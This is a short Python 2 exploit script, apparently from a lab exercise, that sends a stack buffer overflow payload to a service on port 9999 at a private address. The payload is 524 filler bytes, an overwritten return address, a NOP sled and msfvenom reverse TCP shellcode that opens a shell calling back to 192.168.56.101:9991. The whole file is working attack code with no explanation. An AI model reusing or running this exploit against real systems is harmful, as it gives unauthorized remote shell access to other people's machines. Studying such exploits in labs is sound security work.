#!/usr/bin/python2
import socket
import sys
import struct

ip = '192.168.56.103'
port = 9999

buf = ""
buf += "A" * 524
buf += str(struct.pack("I", 0x311712f3))
buf += "\x90" * 15

#  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=9991 -f python -b '\x00'

buf += "\xb8\x87\x64\x14\x1b\xda\xc8\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x12\x31\x42\x12\x83\xea\xfc\x03\xc5\x6a\xf6"
buf += "\xee\xf8\xa9\x01\xf3\xa9\x0e\xbd\x9e\x4f\x18\xa0\xef"
buf += "\x29\xd7\xa3\x83\xec\x57\x9c\x6e\x8e\xd1\x9a\x89\xe6"
buf += "\x21\xf4\x52\x93\xc9\x07\xa3\x7c\x0d\x81\x42\x32\x77"
buf += "\xc1\xd5\x61\xcb\xe2\x5c\x64\xe6\x65\x0c\x0e\x97\x4a"
buf += "\xc2\xa6\x0f\xba\x0b\x54\xb9\x4d\xb0\xca\x6a\xc7\xd6"
buf += "\x5a\x87\x1a\x98"

try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, port))
     s.send(buf)
     s.close()

except:
         print("[*] Cannot connect to %s" % ip)
         sys.exit()
